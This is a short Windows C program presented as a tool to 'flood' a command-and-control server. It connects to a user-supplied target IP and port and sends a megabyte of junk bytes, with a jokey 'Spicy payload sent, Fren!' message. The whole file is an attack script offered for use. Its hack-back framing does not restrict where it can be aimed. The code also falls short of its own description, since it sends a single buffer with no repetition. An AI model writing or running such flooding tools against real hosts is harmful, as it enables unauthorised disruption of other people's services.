/**
 * c2_ddoser.c - C program to flood a C2 server with junk data
 */

 #include <winsock2.h>
 #include <stdio.h>
 #include <stdlib.h>
 
 #pragma comment(lib, "ws2_32.lib")
 
 void send_spicy() {
     WSADATA wsa;
     SOCKET s;
     struct sockaddr_in server;
     char* junk = malloc(1000000);
     memset(junk, 'A', 1000000);
 
     if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
         fprintf(stderr, "WSAStartup failed, Fren!\n");
         return;
     }
 
     s = socket(AF_INET, SOCK_STREAM, 0);
     if (s == INVALID_SOCKET) {
         fprintf(stderr, "Socket creation failed, Fren!\n");
         WSACleanup();
         return;
     }
 
     server.sin_addr.s_addr = inet_addr("192.168.1.100"); // Replace with target IP
     server.sin_family = AF_INET;
     server.sin_port = htons(8080); // Replace with target port
 
     if (connect(s, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
         fprintf(stderr, "Connection failed, Fren!\n");
         closesocket(s);
         WSACleanup();
         return;
     }
 
     if (send(s, junk, 1000000, 0) == SOCKET_ERROR) {
         fprintf(stderr, "Send failed, Fren!\n");
     } else {
         printf("Spicy payload sent, Fren!\n");
     }
 
     closesocket(s);
     WSACleanup();
     free(junk);
 }
 
 int main() {
     send_spicy();
     return 0;
 }